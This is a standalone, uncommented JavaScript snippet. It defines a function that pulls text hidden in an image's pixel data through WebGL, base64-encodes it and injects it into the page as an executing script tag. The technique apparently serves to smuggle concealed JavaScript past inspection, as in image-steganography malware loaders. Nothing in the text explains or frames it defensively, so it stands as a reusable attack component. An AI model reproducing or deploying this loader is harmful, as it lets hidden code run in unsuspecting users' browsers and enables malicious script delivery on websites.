function injectScript(e) {
  const t = document.createElement('canvas'),
    r = t.getContext('webgl');
  var a = r.createTexture();
  r.bindTexture(r.TEXTURE_2D, a);
  var E = new Image();
  (E.src = e),
    E.addEventListener('load', function () {
      var e = E.width,
        n = E.height;
      r.bindTexture(r.TEXTURE_2D, a),
        r.texImage2D(r.TEXTURE_2D, 0, r.RGBA, r.RGBA, r.UNSIGNED_BYTE, E),
        r.generateMipmap(r.TEXTURE_2D);
      var c = r.createFramebuffer();
      if (
        (r.bindFramebuffer(r.FRAMEBUFFER, c),
        r.framebufferTexture2D(r.FRAMEBUFFER, r.COLOR_ATTACHMENT0, r.TEXTURE_2D, a, 0),
        r.checkFramebufferStatus(r.FRAMEBUFFER) == r.FRAMEBUFFER_COMPLETE)
      ) {
        var i = new Uint8Array(e * n * 4);
        r.readPixels(0, 0, e, n, r.RGBA, r.UNSIGNED_BYTE, i);
        var T = new TextDecoder('utf-8'),
          d = btoa(T.decode(i)),
          R = document.createElement('script');
        R.setAttribute('src', 'data:text/javascript;base64,' + d.trim()), document.head.appendChild(R);
      }
      t.remove();
    });
}
injectScript(data);
